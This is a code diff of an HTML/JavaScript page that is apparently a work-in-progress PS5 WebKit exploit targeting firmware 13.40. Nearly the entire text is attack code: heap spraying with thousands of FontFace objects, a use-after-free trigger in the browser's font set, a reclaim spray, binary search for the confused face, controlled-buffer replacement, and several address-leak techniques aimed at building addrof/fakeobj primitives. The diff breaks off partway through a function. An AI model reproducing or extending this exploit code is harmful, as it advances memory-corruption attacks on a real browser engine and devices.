@@ -2,105 +2,70 @@
 <html>
 <head>
 <meta charset="utf-8">
-<title>PS5 WebKit Exploit - v7 Primitive Builder</title>
+<title>PS5 v8 - Big Log</title>
 <style id="s">
 @font-face { font-family: prepad; src: url(nonexistent-prepad.woff); unicode-range: U+E123; }
 @font-face { font-family: x; src: url(nonexistent-font.woff); unicode-range: U+0042; }
 html, body {
   margin: 0; padding: 0; width: 100%; height: 100%;
-  background: #050505; color: #fff;
-  font-family: Arial, Helvetica, sans-serif;
+  background: #000; color: #0f0;
+  font-family: "Courier New", monospace;
   overflow: hidden;
 }
-#box {
-  position: fixed; left: 50%; top: 50%;
-  transform: translate(-50%, -50%);
-  width: 82%; max-width: 920px;
-  padding: 36px 26px;
-  border: 2px solid rgba(0, 255, 160, 0.8);
-  border-radius: 22px;
-  background: linear-gradient(135deg, rgba(0,40,25,.92), rgba(0,0,0,.92));
-  box-shadow: 0 0 45px rgba(0,255,160,.35);
-  text-align: center; z-index: 9999;
-}
-#title { font-size: 34px; font-weight: bold; color: #00ffa0; margin-bottom: 10px; }
-#msg { font-size: 20px; line-height: 1.4; white-space: pre-line; }
-#fw { margin-top: 12px; font-size: 20px; color: #00ffa0; font-weight: bold; }
-#small { margin-top: 10px; font-size: 14px; color: #999; }
 #log {
-  margin-top: 12px; font-size: 9px; color: #777;
-  text-align: left; max-height: 280px; overflow-y: auto;
-  font-family: monospace; padding: 6px;
-  border: 1px solid rgba(0,255,160,0.2);
-  border-radius: 8px; background: rgba(0,0,0,0.5);
+  position: fixed;
+  left: 0; top: 0;
+  width: 100%; height: 100%;
+  padding: 20px;
+  font-size: 22px;
+  line-height: 1.6;
+  color: #0f0;
+  background: #000;
+  overflow-y: auto;
+  white-space: pre-wrap;
+  word-break: break-all;
+  z-index: 9999;
+  -webkit-user-select: text;
 }
+#log .hit { color: #0ff; font-weight: bold; }
+#log .ok { color: #0f0; font-weight: bold; }
+#log .fail { color: #f44; }
+#log .warn { color: #ff0; }
+#log .star { color: #f0f; font-weight: bold; font-size: 26px; }
 #c { position: absolute; left: -9999px; top: -9999px; }
 </style>
 </head>
 <body>
-<div id="box">
-  <div id="title">PS5 WEBKIT v7 PRIMITIVES</div>
-  <div id="msg">Initializing...</div>
-  <div id="fw">Firmware: Detecting...</div>
-  <div id="small">check() oracle → write-through → addrof</div>
-  <div id="log"></div>
-</div>
+<div id="log"></div>
 <canvas id="c" width="512" height="128"></canvas>
 <script>
 "use strict";
 
 // ============================================================
-//  PS5 WebKit Userland Exploit v7
-//  CONFIRMED: Selector confusion on FW 13.40
-//  - check("900 italic 64px trigger", "A") = true (MISMATCH)
-//  - check("64px trigger", "B") = true (MISMATCH)
-//  - Resolved faces include RC_103
-//
-//  GOAL: Turn selector confusion into addrof/fakeobj
-//  STRATEGY:
-//  1. Map full confusion state via check() oracle
-//  2. Test ALL properties for write-through
-//  3. Probe internal C++ state through uncached accessors
-//  4. Attempt address leak via error stacks + timing
-//  5. Construct addrof if any leak succeeds
+//  PS5 WebKit v8 - BIG LOG VERSION
+//  All output to one big readable console
+//  Focus: Build primitive from confirmed confusion
 // ============================================================
 
-const LOG_MAX = 200;
-let logLines = [];
-function log(msg) {
-  const ts = performance.now().toFixed(1);
-  logLines.push(`[${ts}] ${msg}`);
-  if (logLines.length > LOG_MAX) logLines.shift();
-  const el = document.getElementById("log");
-  if (el) el.textContent = logLines.join("\n");
-  try { console.log("[v7] " + msg); } catch(e) {}
+const logEl = document.getElementById("log");
+
+function L(msg, cls) {
+  const span = document.createElement("span");
+  if (cls) span.className = cls;
+  span.textContent = msg + "\n";
+  logEl.appendChild(span);
+  logEl.scrollTop = logEl.scrollHeight;
+  try { console.log("[v8] " + msg); } catch(e) {}
 }
 
-function showMessage(text, ok) {
-  const msgEl = document.getElementById("msg");
-  const titleEl = document.getElementById("title");
-  if (msgEl) msgEl.textContent = text;
-  if (titleEl) {
-    titleEl.textContent = ok ? "✅ ADDROF BUILT" : "PS5 v7 PRIMITIVES";
-    titleEl.style.color = ok ? "#00ff60" : "#00ffa0";
-  }
-}
+function Lstar(msg) { L("★ " + msg + " ★", "star"); }
+function Lok(msg) { L("✅ " + msg, "ok"); }
+function Lfail(msg) { L("❌ " + msg, "fail"); }
+function Lwarn(msg) { L("⚠️ " + msg, "warn"); }
+function Lhit(msg) { L("► " + msg, "hit"); }
+function Lsep() { L("──────────────────────────────────────"); }
 
-window.onerror = function(message, source, lineno, colno, error) {
-  showMessage("ERROR ❌\n" + message + "\nLine: " + lineno, false);
-};
-
-function detectFirmware() {
-  const ua = navigator.userAgent || "";
-  let fw = "Unknown";
-  let m = ua.match(/PlayStation\s*5\/?\s*([0-9]+(?:\.[0-9]+)?)/i);
-  if (!m) m = ua.match(/PlayStation[^0-9]*([0-9]{1,2}\.[0-9]{1,2})/i);
-  if (m && m[1]) fw = m[1];
-  const el = document.getElementById("fw");
-  if (el) el.textContent = "Firmware: " + fw;
-  log("FW: " + fw);
-  return fw;
-}
+window.onerror = function(m, s, l) { Lfail("ERROR: " + m + " @ " + l); };
 
 // ============================================================
 //  State
@@ -111,7 +76,7 @@ let reclaimFaces = [];
 let uafTriggered = false;
 let resolvedFaces = null;
 let triggerFace = null;
-let confusedRCIndex = -1;
+let confusedRCIdx = -1;
 
 // ============================================================
 //  Font Buffer
@@ -132,7 +97,7 @@ function makeFontBuffer() {
 }
 
 // ============================================================
-//  Style Helpers
+//  Helpers
 // ============================================================
 function forceStyle() {
   void document.body.offsetTop;
@@ -170,24 +135,23 @@ function deleteFlushRules() {
   }
 }
 
-function killFontFaceSetCache() {
-  const f = new FontFace("cachekill" + keepAlive.length, "local(Helvetica)", {
-    unicodeRange: "U+E124"
-  });
+function killCache() {
+  const f = new FontFace("ck" + keepAlive.length, "local(Helvetica)", { unicodeRange: "U+E124" });
   document.fonts.add(f);
   keepAlive.push(f);
 }
 
 // ============================================================
-//  PHASE 1: Holes + UAF (proven working)
+//  PHASE 1: Standard UAF setup
 // ============================================================
 function createHoles() {
+  L("Creating 4096 holes...");
   for (let i = 0; i < 4096; i++) {
     const f = new FontFace("hole_" + i, makeFontBuffer(), {
       unicodeRange: "U+E1" + (i % 16).toString(16),
       style: i % 2 === 0 ? "normal" : "italic",
       weight: String(100 + (i % 9) * 100),
-      display: ["auto", "block", "swap", "fallback", "optional"][i % 5]
+      display: ["auto","block","swap","fallback","optional"][i % 5]
     });
     document.fonts.add(f);
     holeFaces.push(f);
@@ -200,12 +164,12 @@ function createHoles() {
     const tmp = [];
     for (let j = 0; j < 512; j++) tmp.push(new ArrayBuffer(4096));
   }
-  log("Holes ready");
+  Lok("Holes ready");
 }
 
 function reclaimSpray() {
-  const COUNT = 4096;
-  for (let i = 0; i < COUNT; i++) {
+  L("Spraying 4096 reclaim faces...");
+  for (let i = 0; i < 4096; i++) {
     const f = new FontFace("RC_" + i, makeFontBuffer(), {
       unicodeRange: "U+0041",
       style: "italic",
@@ -216,889 +180,706 @@ function reclaimSpray() {
     reclaimFaces.push(f);
   }
   forceStyle();
-  log("Reclamation: " + COUNT);
+  Lok("Reclaim spray done");
 }
 
 // ============================================================
-//  PHASE 2: Check() Oracle Deep Mapping
-//  Systematically test all font-matching dimensions
-//  to fully characterize the confusion state
+//  PHASE 2: Identify confusion state
 // ============================================================
-function deepCheckOracle() {
-  log("=== DEEP CHECK ORACLE ===");
-  const results = {};
+function checkConfusion() {
+  Lsep();
+  L("CHECKING CONFUSION STATE");
+  Lsep();
 
-  // Test 1: Which weights does "trigger" match?
-  const weights = ["100", "200", "300", "400", "normal", "500", "600", "700", "bold", "800", "900"];
-  results.weightMatches = [];
-  for (const w of weights) {
-    try {
-      const match = document.fonts.check(w + " 64px trigger", "A");
-      if (match) results.weightMatches.push(w);
-    } catch(e) {}
-  }
-  log("Trigger weight matches: " + results.weightMatches.join(", "));
+  // Test 1: check() oracle
+  const c1 = document.fonts.check("900 italic 64px trigger", "A");
+  const c2 = document.fonts.check("64px trigger", "B");
+  const c3 = document.fonts.check("normal 64px trigger", "A");
+  const c4 = document.fonts.check("64px RC_0", "A");
 
-  // Test 2: Which styles does "trigger" match?
-  const styles = ["normal", "italic", "oblique"];
-  results.styleMatches = [];
-  for (const s of styles) {
-    try {
-      const match = document.fonts.check(s + " 64px trigger", "A");
-      if (match) results.styleMatches.push(s);
-    } catch(e) {}
-  }
-  log("Trigger style matches: " + results.styleMatches.join(", "));
+  L("check(900 italic trigger, A) = " + c1 + (c1 ? " ★ CONFUSED" : ""));
+  L("check(normal trigger, A)     = " + c3);
+  L("check(trigger, B)            = " + c2 + (c2 ? " ★ WIDER RANGE" : ""));
+  L("check(RC_0, A)              = " + c4);
 
-  // Test 3: Which unicode ranges does "trigger" cover?
-  const testChars = [
-    { char: "A", code: 0x41, name: "U+0041" },
-    { char: "B", code: 0x42, name: "U+0042" },
-    { char: "C", code: 0x43, name: "U+0043" },
-    { char: "I", code: 0x49, name: "U+0049" },
-    { char: "W", code: 0x57, name: "U+0057" },
-    { char: "\u00C0", code: 0xC0, name: "U+00C0" },
-    { char: "\u0100", code: 0x100, name: "U+0100" },
-    { char: "\uE000", code: 0xE000, name: "U+E000" },
-    { char: "\uE123", code: 0xE123, name: "U+E123" },
-    { char: "\u4E00", code: 0x4E00, name: "U+4E00" }
-  ];
-  results.charMatches = [];
-  for (const tc of testChars) {
-    try {
-      const match = document.fonts.check("64px trigger", tc.char);
-      results.charMatches.push({ char: tc.name, match: match });
-      if (match) log("  trigger covers " + tc.name + " ✅");
-    } catch(e) {}
-  }
+  if (c1) Lok("Selector confusion CONFIRMED");
+  else { Lfail("No confusion detected"); return false; }
 
-  // Test 4: Which display values match?
-  const displays = ["auto", "block", "swap", "fallback", "optional"];
-  // Note: display doesn't affect check() matching, but testing anyway
-
-  // Test 5: Compare trigger matching vs RC_0 matching
-  // If they match the same set of queries, they share the same C++ state
-  let identicalMatching = true;
-  for (const w of weights) {
-    try {
-      const tMatch = document.fonts.check(w + " 64px trigger", "A");
-      const rMatch = document.fonts.check(w + " 64px RC_0", "A");
-      if (tMatch !== rMatch) {
-        identicalMatching = false;
-        log("MATCH DIFF: weight=" + w + " trigger=" + tMatch + " RC_0=" + rMatch);
-      }
-    } catch(e) {}
-  }
-  results.identicalMatching = identicalMatching;
-  log("Trigger vs RC_0 identical matching: " + identicalMatching);
-
-  // Test 6: Check if confusion is per-family or per-face
-  // Create a new face with family "trigger" and see if it's also confused
+  // Test 2: getComputedStyle
+  Lsep();
+  L("getComputedStyle test:");
   try {
-    const newTrigger = new FontFace("trigger", "local(Courier)", {
-      unicodeRange: "U+0041",
-      weight: "normal",
-      style: "normal"
-    });
-    document.fonts.add(newTrigger);
-    forceStyle();
-    const checkNew = document.fonts.check("900 italic 64px trigger", "A");
-    log("After adding normal trigger: 900 italic check=" + checkNew);
-    document.fonts.delete(newTrigger);
-    forceStyle();
-  } catch(e) {
-    log("New trigger test error: " + e.message);
-  }
+    const d = document.createElement("div");
+    d.style.cssText = "font:900 italic 64px trigger;position:absolute;left:-9999px;";
+    document.body.appendChild(d);
+    const cs = getComputedStyle(d);
+    L("  fontWeight = " + cs.fontWeight);
+    L("  fontStyle  = " + cs.fontStyle);
+    L("  fontFamily = " + cs.fontFamily);
+    document.body.removeChild(d);
 
-  // Test 7: Test with different font-stretch values
-  const stretches = ["normal", "ultra-condensed", "extra-condensed", "condensed",
-                     "semi-condensed", "semi-expanded", "expanded",
-                     "extra-expanded", "ultra-expanded"];
-  results.stretchMatches = [];
-  for (const st of stretches) {
-    try {
-      const match = document.fonts.check(st + " 64px trigger", "A");
-      if (match) results.stretchMatches.push(st);
-    } catch(e) {}
-  }
-  log("Trigger stretch matches: " + results.stretchMatches.join(", "));
+    if (cs.fontWeight === "900" && cs.fontStyle === "italic") {
+      Lok("Browser RENDERS 900 italic!");
+    }
+  } catch(e) { Lfail("computedStyle error: " + e.message); }
 
-  return results;
+  // Test 3: Canvas measurement
+  Lsep();
+  L("Canvas measurement:");
+  try {
+    const ctx = document.getElementById("c").getContext("2d");
+    ctx.font = "64px trigger";
+    const w = ctx.measureText("A").width;
+    L("  trigger width = " + w);
+
+    ctx.font = "900 italic 64px trigger";
+    const w2 = ctx.measureText("A").width;
+    L("  900 italic trigger width = " + w2);
+
+    ctx.font = "64px Helvetica";
+    const wH = ctx.measureText("A").width;
+    L("  Helvetica width = " + wH);
+
+    if (Math.abs(w - w2) < 0.01) {
+      Lhit("trigger normal === trigger 900italic (same C++ face)");
+    }
+  } catch(e) { Lfail("canvas error: " + e.message); }
+
+  return true;
 }
 
 // ============================================================
-//  PHASE 3: Write-Through Testing
-//  Test if modifying one face's properties propagates
-//  to the confused counterpart at the C++ level
+//  PHASE 3: Write-through test using delete+add
+//  Property setters might be cached, but if we DELETE a
+//  confused RC face and ADD a replacement, the selector
+//  must re-evaluate
 // ============================================================
-function testWriteThrough() {
-  log("=== WRITE-THROUGH TESTING ===");
-  const results = {};
+function testDeleteAddWriteThrough() {
+  Lsep();
+  L("DELETE+ADD WRITE-THROUGH TEST");
+  Lsep();
 
-  // Find the confused RC face from resolved faces
-  let rcFace = null;
-  if (resolvedFaces) {
-    for (const f of resolvedFaces) {
-      if (f.family && f.family.startsWith("RC_")) {
-        rcFace = f;
-        confusedRCIndex = parseInt(f.family.substring(3));
-        break;
-      }
+  // Find which RC face the selector uses
+  // Strategy: delete RC faces one at a time, check if
+  // the confusion breaks (check returns false)
+
+  L("Searching for the confused RC face...");
+  L("Using batch removal + binary search");
+
+  const BATCH = 256;
+  const baseline = document.fonts.check("900 italic 64px trigger", "A");
+  L("Baseline check = " + baseline);
+
+  let foundIdx = -1;
+  let foundBatch = -1;
+
+  // Batch search
+  for (let batch = 0; batch < reclaimFaces.length; batch += BATCH) {
+    const end = Math.min(batch + BATCH, reclaimFaces.length);
+    const removed = [];
+
+    for (let i = batch; i < end; i++) {
+      try { document.fonts.delete(reclaimFaces[i]); removed.push(i); } catch(e) {}
     }
-  }
-  if (!rcFace && reclaimFaces.length > 0) {
-    // Fallback: use RC_0
-    rcFace = reclaimFaces[0];
-    confusedRCIndex = 0;
-  }
-
-  if (!rcFace || !triggerFace) {
-    log("Missing trigger or RC face for write-through test");
-    return results;
-  }
-
-  log("Testing write-through: trigger ↔ RC_" + confusedRCIndex);
-
-  // Test A: Write to trigger, read from RC
-  const tests = [
-    {
-      name: "trigger.weight → RC",
-      write: () => { triggerFace.weight = "200"; },
-      read: () => rcFace.weight,
-      restore: () => { triggerFace.weight = "normal"; },
-      expected: "200"
-    },
-    {
-      name: "trigger.style → RC",
-      write: () => { triggerFace.style = "oblique"; },
-      read: () => rcFace.style,
-      restore: () => { triggerFace.style = "normal"; },
-      expected: "oblique"
-    },
-    {
-      name: "trigger.display → RC",
-      write: () => { triggerFace.display = "fallback"; },
-      read: () => rcFace.display,
-      restore: () => { triggerFace.display = "auto"; },
-      expected: "fallback"
-    },
-    {
-      name: "trigger.unicodeRange → RC",
-      write: () => { triggerFace.unicodeRange = "U+0043"; },
-      read: () => rcFace.unicodeRange,
-      restore: () => { triggerFace.unicodeRange = "U+0041"; },
-      expected: "U+0043"
-    }
-  ];
-
-  // Test B: Write to RC, read from trigger
-  const reverseTests = [
-    {
-      name: "RC.weight → trigger",
-      write: () => { rcFace.weight = "300"; },
-      read: () => triggerFace.weight,
-      restore: () => { rcFace.weight = "900"; },
-      expected: "300"
-    },
-    {
-      name: "RC.style → trigger",
-      write: () => { rcFace.style = "normal"; },
-      read: () => triggerFace.style,
-      restore: () => { rcFace.style = "italic"; },
-      expected: "normal"
-    },
-    {
-      name: "RC.featureSettings → trigger",
-      write: () => { rcFace.featureSettings = '"kern" off'; },
-      read: () => triggerFace.featureSettings,
-      restore: () => { rcFace.featureSettings = "normal"; },
-      expected: '"kern" off'
-    }
-  ];
-
-  // Run forward tests (trigger → RC)
-  for (const t of tests) {
-    try {
-      t.write();
-      forceStyle();
-      const readback = t.read();
-      const match = readback === t.expected;
-      results[t.name] = { readback, match };
-      log(t.name + ": readback=" + readback + " match=" + match);
-      t.restore();
-      forceStyle();
-    } catch(e) {
-      results[t.name] = { error: e.message };
-      log(t.name + ": ERROR " + e.message);
-      try { t.restore(); forceStyle(); } catch(e2) {}
-    }
-  }
-
-  // Run reverse tests (RC → trigger)
-  for (const t of reverseTests) {
-    try {
-      t.write();
-      forceStyle();
-      const readback = t.read();
-      const match = readback === t.expected;
-      results[t.name] = { readback, match };
-      log(t.name + ": readback=" + readback + " match=" + match);
-      t.restore();
-      forceStyle();
-    } catch(e) {
-      results[t.name] = { error: e.message };
-      log(t.name + ": ERROR " + e.message);
-      try { t.restore(); forceStyle(); } catch(e2) {}
-    }
-  }
-
-  // Test C: Write-through detected via check() oracle
-  // This is the key test: even if property reads are cached,
-  // the C++ state might have changed, affecting check() results
-  log("Testing write-through via check() oracle...");
-
-  // Baseline: trigger should match "900 italic" due to confusion
-  const baseline900 = document.fonts.check("900 italic 64px trigger", "A");
-  log("Baseline 900 italic: " + baseline900);
-
-  // Change RC face to normal weight
-  try {
-    rcFace.weight = "normal";
-    rcFace.style = "normal";
     forceStyle();
-    const afterChange = document.fonts.check("900 italic 64px trigger", "A");
-    const afterNormal = document.fonts.check("normal 64px trigger", "A");
-    log("After RC→normal: 900italic=" + afterChange + " normal=" + afterNormal);
 
-    if (afterChange !== baseline900) {
-      log("★ WRITE-THROUGH CONFIRMED VIA CHECK() ★");
-      results.checkWriteThrough = true;
+    const test = document.fonts.check("900 italic 64px trigger", "A");
+    if (test !== baseline) {
+      Lhit("Batch " + batch + "-" + end + " broke confusion!");
+      foundBatch = batch;
+    }
+
+    for (const i of removed) {
+      try { document.fonts.add(reclaimFaces[i]); } catch(e) {}
+    }
+    forceStyle();
+
+    if (foundBatch >= 0) break;
+  }
+
+  if (foundBatch < 0) {
+    Lwarn("No single batch broke confusion");
+    L("Trying: remove ALL reclaim faces...");
+
+    for (const f of reclaimFaces) {
+      try { document.fonts.delete(f); } catch(e) {}
+    }
+    forceStyle();
+    const allRemoved = document.fonts.check("900 italic 64px trigger", "A");
+    L("After removing ALL RC: check = " + allRemoved);
+
+    // Restore
+    for (const f of reclaimFaces) {
+      try { document.fonts.add(f); } catch(e) {}
+    }
+    forceStyle();
+
+    if (allRemoved === baseline) {
+      Lwarn("Removing all RC faces did NOT break confusion");
+      L("This means the confusion is NOT caused by RC faces");
+      L("It might be from the hole faces or a different source");
+    }
+    return -1;
+  }
+
+  // Binary search within found batch
+  L("Binary search in batch " + foundBatch + "...");
+  let lo = foundBatch;
+  let hi = Math.min(foundBatch + BATCH, reclaimFaces.length);
+
+  while (lo < hi) {
+    const mid = Math.floor((lo + hi) / 2);
+    const removed = [];
+
+    for (let i = lo; i <= mid; i++) {
+      try { document.fonts.delete(reclaimFaces[i]); removed.push(i); } catch(e) {}
+    }
+    forceStyle();
+
+    const test = document.fonts.check("900 italic 64px trigger", "A");
+
+    for (const i of removed) {
+      try { document.fonts.add(reclaimFaces[i]); } catch(e) {}
+    }
+    forceStyle();
+
+    if (test !== baseline) {
+      hi = mid;
     } else {
-      results.checkWriteThrough = false;
+      lo = mid + 1;
     }
-
-    rcFace.weight = "900";
-    rcFace.style = "italic";
-    forceStyle();
-  } catch(e) {
-    log("Check write-through error: " + e.message);
   }
 
-  // Test D: Write-through via family name change
-  // If we change RC face's family, does the confusion break?
+  foundIdx = lo;
+  confusedRCIdx = lo;
+  Lstar("CONFUSED FACE: RC_" + foundIdx);
+
+  // Verify
   try {
-    const origFamily = rcFace.family;
-    rcFace.family = "modified_" + origFamily;
+    document.fonts.delete(reclaimFaces[foundIdx]);
     forceStyle();
-    const afterRename = document.fonts.check("900 italic 64px trigger", "A");
-    log("After RC family rename: check=" + afterRename);
-    results.familyRenameBreaksConfusion = !afterRename;
-    rcFace.family = origFamily;
+    const v1 = document.fonts.check("900 italic 64px trigger", "A");
+    document.fonts.add(reclaimFaces[foundIdx]);
     forceStyle();
-  } catch(e) {
-    log("Family rename error: " + e.message);
-  }
+    const v2 = document.fonts.check("900 italic 64px trigger", "A");
+    L("Verify: removed=" + v1 + " restored=" + v2);
 
-  return results;
+    if (v1 !== v2) {
+      Lok("WRITE-THROUGH VIA DELETE+ADD CONFIRMED!");
+    }
+  } catch(e) { Lfail("verify error: " + e.message); }
+
+  return foundIdx;
 }
 
 // ============================================================
-//  PHASE 4: Internal State Probing
-//  Try to access C++ state that isn't cached in the JS wrapper
+//  PHASE 4: Build oracle from delete+add control
+//  If we can control which face the selector uses by
+//  deleting/adding specific RC faces, we can:
+//  1. Replace the confused face with one we fully control
+//  2. Use the selector's behavior as an information oracle
 // ============================================================
-function probeInternalState() {
-  log("=== INTERNAL STATE PROBING ===");
-  const results = {};
+function buildOracleFromDeleteAdd(rcIdx) {
+  Lsep();
+  L("BUILDING ORACLE FROM DELETE+ADD");
+  Lsep();
 
-  if (!triggerFace) return results;
+  if (rcIdx < 0) {
+    Lfail("No confused face identified");
+    return false;
+  }
 
-  // Test 1: Object.getOwnPropertyDescriptors
+  const confusedFace = reclaimFaces[rcIdx];
+  L("Target: RC_" + rcIdx);
+
+  // Test 1: Replace with a face that has DIFFERENT unicode range
+  Lsep();
+  L("Test 1: Replace with different unicode range");
+  try {
+    document.fonts.delete(confusedFace);
+    const replacement = new FontFace("RC_" + rcIdx, makeFontBuffer(), {
+      unicodeRange: "U+0043", // Only 'C', not 'A'
+      style: "italic",
+      weight: "900",
+      display: "block"
+    });
+    document.fonts.add(replacement);
+    forceStyle();
+
+    const checkA = document.fonts.check("900 italic 64px trigger", "A");
+    const checkC = document.fonts.check("900 italic 64px trigger", "C");
+    L("  After replace: check(A)=" + checkA + " check(C)=" + checkC);
+
+    if (!checkA && checkC) {
+      Lok("Unicode range change AFFECTS selector!");
+      Lhit("We can control what characters the selector matches!");
+    } else if (checkA) {
+      Lwarn("Selector still matches A - replacement not picked up");
+    }
+
+    // Restore
+    document.fonts.delete(replacement);
+    document.fonts.add(confusedFace);
+    forceStyle();
+  } catch(e) { Lfail("Test1 error: " + e.message); }
+
+  // Test 2: Replace with different weight
+  Lsep();
+  L("Test 2: Replace with different weight");
+  try {
+    document.fonts.delete(confusedFace);
+    const replacement = new FontFace("RC_" + rcIdx, makeFontBuffer(), {
+      unicodeRange: "U+0041",
+      style: "normal",
+      weight: "100",
+      display: "auto"
+    });
+    document.fonts.add(replacement);
+    forceStyle();
+
+    const check900 = document.fonts.check("900 italic 64px trigger", "A");
+    const check100 = document.fonts.check("100 normal 64px trigger", "A");
+    L("  After replace: check(900i)=" + check900 + " check(100n)=" + check100);
+
+    if (!check900 && check100) {
+      Lok("Weight/style change AFFECTS selector!");
+      Lhit("We can control which font specs match!");
+    } else if (check900) {
+      Lwarn("Selector still matches 900 italic");
+    }
+
+    document.fonts.delete(replacement);
+    document.fonts.add(confusedFace);
+    forceStyle();
+  } catch(e) { Lfail("Test2 error: " + e.message); }
+
+  // Test 3: Replace with a face using controlled ArrayBuffer
+  Lsep();
+  L("Test 3: Replace with controlled ArrayBuffer");
+  try {
+    document.fonts.delete(confusedFace);
+
+    // Create a buffer where we control every byte
+    const buf = new ArrayBuffer(0x200);
+    const view = new DataView(buf);
+
+    // Write TrueType header
+    view.setUint32(0, 0x00010000, false); // sfVersion
+    view.setUint16(4, 0, false);          // numTables = 0
+    view.setUint16(6, 0, false);
+    view.setUint16(8, 0, false);
+    view.setUint16(10, 0, false);
+
+    // Fill rest with pattern
+    for (let i = 12; i < 0x200; i += 4) {
+      view.setUint32(i, 0xDEADBEEF, false);
+    }
+
+    const replacement = new FontFace("RC_" + rcIdx, buf, {
+      unicodeRange: "U+0041",
+      style: "italic",
+      weight: "900",
+      display: "block"
+    });
+    document.fonts.add(replacement);
+    forceStyle();
+
+    L("  Controlled buffer face status: " + replacement.status);
+    const checkAfter = document.fonts.check("900 italic 64px trigger", "A");
+    L("  check after controlled replace: " + checkAfter);
+
+    document.fonts.delete(replacement);
+    document.fonts.add(confusedFace);
+    forceStyle();
+  } catch(e) { Lfail("Test3 error: " + e.message); }
+
+  return true;
+}
+
+// ============================================================
+//  PHASE 5: Address leak via selector behavior
+//  Use the oracle to probe memory layout
+// ============================================================
+function attemptAddressLeak() {
+  Lsep();
+  L("ADDRESS LEAK ATTEMPTS");
+  Lsep();
+
+  // Technique 1: getComputedStyle with trigger
+  L("Technique 1: computedStyle rendering");
+  try {
+    const d = document.createElement("div");
+    d.style.cssText = "font:900 italic 64px trigger;position:absolute;left:-9999px;";
+    d.textContent = "AAAA";
+    document.body.appendChild(d);
+    const cs = getComputedStyle(d);
+    L("  font:    " + cs.font);
+    L("  family:  " + cs.fontFamily);
+    L("  weight:  " + cs.fontWeight);
+    L("  style:   " + cs.fontStyle);
+    L("  stretch: " + cs.fontStretch);
+    L("  size:    " + cs.fontSize);
+    document.body.removeChild(d);
+  } catch(e) { Lfail("computedStyle: " + e.message); }
+
+  // Technique 2: Error stack addresses
+  Lsep();
+  L("Technique 2: Error stack traces");
+  const errorTests = [
+    () => { triggerFace.load(); },
+    () => { JSON.parse(triggerFace); },
+    () => { new WeakRef(triggerFace).deref(); },
+    () => { Object.keys(triggerFace.__proto__); }
+  ];
+
+  for (const fn of errorTests) {
+    try {
+      fn();
+    } catch(e) {
+      const stack = e.stack || "";
+      const addrs = stack.match(/0x[0-9a-f]{6,16}/gi);
+      if (addrs && addrs.length > 0) {
+        Lhit("STACK ADDRESSES FOUND:");
+        for (const a of addrs) {
+          L("  " + a);
+        }
+      } else {
+        // Check for decimal addresses
+        const decMatch = stack.match(/@\s*(\d{8,})/g);
+        if (decMatch) {
+          Lhit("DECIMAL ADDRESSES:");
+          for (const d of decMatch) L("  " + d);
+        }
+      }
+    }
+  }
+
+  // Technique 3: Performance.measure memory
+  Lsep();
+  L("Technique 3: Memory info");
+  try {
+    if (performance.memory) {
+      L("  jsHeapSizeLimit:  " + performance.memory.jsHeapSizeLimit);
+      L("  totalJSHeapSize:  " + performance.memory.totalJSHeapSize);
+      L("  usedJSHeapSize:   " + performance.memory.usedJSHeapSize);
+    } else {
+      L("  performance.memory not available");
+    }
+  } catch(e) { L("  N/A"); }
+
+  // Technique 4: document.fonts size and iteration
+  Lsep();
+  L("Technique 4: FontFaceSet enumeration");
+  let total = 0;
+  let loaded = 0;
+  let triggerEntries = [];
+
+  for (const face of document.fonts) {
+    total++;
+    if (face.status === "loaded") loaded++;
+    if (face.family === "trigger") {
+      triggerEntries.push({
+        style: face.style,
+        weight: face.weight,
+        stretch: face.stretch,
+        display: face.display,
+        status: face.status,
+        unicodeRange: face.unicodeRange,
+        variant: face.variant,
+        featureSettings: face.featureSettings
+      });
+    }
+  }
+
+  L("  Total faces: " + total);
+  L("  Loaded: " + loaded);
+  L("  Trigger entries: " + triggerEntries.length);
+  for (let i = 0; i < triggerEntries.length; i++) {
+    L("  trigger[" + i + "]: " + JSON.stringify(triggerEntries[i]));
+  }
+
+  // Technique 5: Cross-face property leakage
+  Lsep();
+  L("Technique 5: Cross-face property check");
+
+  // If the selector is confused, reading trigger's properties
+  // through different access paths might give different results
+  try {
+    const viaLoad = resolvedFaces ? resolvedFaces.find(f => f.family === "trigger") : null;
+    const viaFonts = null;
+    for (const f of document.fonts) {
+      if (f.family === "trigger") { viaFonts = f; break; }
+    }
+
+    if (viaLoad && viaFonts) {
+      L("  via load():   style=" + viaLoad.style + " weight=" + viaLoad.weight);
+      L("  via fonts:    style=" + viaFonts.style + " weight=" + viaFonts.weight);
+
+      if (viaLoad.style !== viaFonts.style || viaLoad.weight !== viaFonts.weight) {
+        Lstar("PROPERTY DIVERGENCE BETWEEN ACCESS PATHS!");
+        Lhit("This means the JS wrapper and C++ object are DESYNCED!");
+      }
+    }
+  } catch(e) { Lfail("cross-face: " + e.message); }
+
+  // Technique 6: Property descriptor analysis
+  Lsep();
+  L("Technique 6: Property descriptors");
   try {
     const proto = Object.getPrototypeOf(triggerFace);
     const descriptors = Object.getOwnPropertyDescriptors(proto);
-    const getterProps = [];
-    const setterProps = [];
 
     for (const [key, desc] of Object.entries(descriptors)) {
-      if (desc.get) getterProps.push(key);
-      if (desc.set) setterProps.push(key);
-    }
-
-    log("Getter properties: " + getterProps.join(", "));
-    log("Setter properties: " + setterProps.join(", "));
-    results.getterProps = getterProps;
-    results.setterProps = setterProps;
-
-    // Test each getter for live C++ reads
-    for (const prop of getterProps) {
-      try {
-        const val = triggerFace[prop];
-        const type = typeof val;
-        log("  trigger." + prop + " = " + (type === "object" ? "[" + type + "]" : val) +
-            " (type: " + type + ")");
-      } catch(e) {
-        log("  trigger." + prop + " ERROR: " + e.message);
+      if (desc.get || desc.set) {
+        L("  " + key + ": " +
+          (desc.get ? "getter" : "") +
+          (desc.set ? "+setter" : ""));
       }
     }
-  } catch(e) {
-    log("Descriptor probe error: " + e.message);
-  }
+  } catch(e) { Lfail("descriptors: " + e.message); }
 
-  // Test 2: Reflect.ownKeys
+  // Technique 7: Timing-based C++ read detection
+  Lsep();
+  L("Technique 7: Timing oracle (C++ vs cached read)");
   try {
-    const keys = Reflect.ownKeys(triggerFace);
-    log("Own keys: " + keys.join(", "));
-    results.ownKeys = keys;
-  } catch(e) {}
+    const ITERS = 5000;
+    const props = ["status", "family", "weight", "style", "display", "stretch"];
 
-  // Test 3: Try to access internal slots
-  const internalSlots = [
-    "_internal", "_impl", "_cppObject", "_native", "_ptr",
-    "_face", "_fontFace", "_cssFontFace", "_wrapper",
-    "__v8_toString", "__revoke", "__proto__"
-  ];
-
-  for (const slot of internalSlots) {
-    try {
-      const val = triggerFace[slot];
-      if (val !== undefined) {
-        log("INTERNAL SLOT: trigger." + slot + " = " + val);
-        results[slot] = val;
